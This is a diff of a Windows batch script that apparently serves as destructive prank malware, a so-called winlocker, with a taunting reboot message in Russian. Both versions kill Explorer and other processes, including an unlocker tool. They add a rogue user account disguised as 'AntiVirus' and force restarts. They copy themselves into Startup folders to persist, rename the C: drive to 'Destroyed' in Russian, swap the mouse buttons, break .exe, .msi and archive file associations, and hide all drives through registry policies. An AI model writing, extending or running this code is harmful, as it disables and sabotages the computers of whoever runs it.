@@ -1,22 +1,31 @@
 chcp 1251
 @echo off
 :a
-color 02
 taskkill /IM explorer.exe /f
-net user %random% LOLH /add
-md %random% %random% %random% %random% %random%
-md %random% %random% %random% %random% %random%
-md %random% %random% %random% %random% %random%
-md %random% %random% %random% %random% %random%
-shutdown /r /t 25 /c "А ты как думал, первая работа можно меня обыграть?" 
+taskkill /IM 1.exe /f
+taskkill /IM 2.exe /f
+taskkill /IM 3.exe /f
+taskkill /IM 0.exe /f
+taskkill /IM 4.exe /f
+taskkill /IM 5.exe /f
+taskkill /IM 6.exe /f
+taskkill /IM 7.exe /f
+taskkill /IM 8.exe /f
+taskkill /IM 9.exe /f
+taskkill /IM SU.exe /f
+taskkill /IM DU.exe /f
+taskkill /IM ExtraUnlocker.exe /f
+net user "AntiVirus %random%" LOLH /add
+shutdown /r /t 20 /c "А ты как думал, первая работа можно меня обыграть?" 
 copy %0 "C:\Users\Public\Desktop"
 copy %0 "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
 copy %0 "C:\Documents and Settings\All Users\Windows\Start Menu\Programs\Startup"
-label C:Encrypted
+label C:Уничтожен
 rundll32 user32, SwapMouseButton
-assoc .exe=.txt
-assoc .msi=.txt
-assoc .exe=.txt
+assoc .exe=txt
+assoc .msi=txt
+assoc .rar=txt
+assoc .zip=txt
 
 reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoDrives /t REG_DWORD /d 67108863 /f 
 reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoViewOnDrive /t REG_DWORD /d 67108863 /f 
